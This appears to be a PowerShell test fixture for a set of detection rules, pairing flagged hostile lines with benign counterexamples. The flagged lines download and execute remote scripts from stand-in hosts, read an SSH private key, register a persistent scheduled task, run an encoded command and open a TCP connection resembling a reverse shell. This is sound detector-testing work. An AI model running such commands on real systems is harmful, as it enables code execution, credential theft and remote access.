# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
# ruleid: LB-C03-herunterladen-ausfuehren-ps
IEX (New-Object Net.WebClient).DownloadString('https://nachlader.invalid/a.ps1')
# ruleid: LB-C03-herunterladen-ausfuehren-ps
irm https://nachlader.invalid/a.ps1 | iex
# ok: LB-C03-herunterladen-ausfuehren-ps
Invoke-WebRequest https://api.example/daten.json -OutFile daten.json
# ruleid: LB-C04-zugangsdaten-lesen-ps
Get-Content "$env:USERPROFILE\.ssh\id_rsa"
# ok: LB-C04-zugangsdaten-lesen-ps
Get-Content "$env:USERPROFILE\.ssh\id_rsa.pub"
# ruleid: LB-C07-persistenz-ps
Register-ScheduledTask -TaskName Hallo -Action $a -Trigger $t
# ok: LB-C07-persistenz-ps
Get-ScheduledTask -TaskName Hallo
# ruleid: LB-C08-verschleiert-ps
powershell -enc ZQBjAGgAbwAgAGgAYQBsAGwAbwA=
# ok: LB-C08-verschleiert-ps
$bild = [Convert]::FromBase64String($daten)
# ruleid: LB-C10-schadmuster-ps
$c = New-Object System.Net.Sockets.TCPClient('gegenstelle.invalid', 4444); $s = $c.GetStream()
# ok: LB-C10-schadmuster-ps
$r = Invoke-RestMethod https://api.example/status
# ok: LB-C03-herunterladen-ausfuehren-ps
# IEX (New-Object Net.WebClient).DownloadString('https://nachlader.invalid/kommentar')
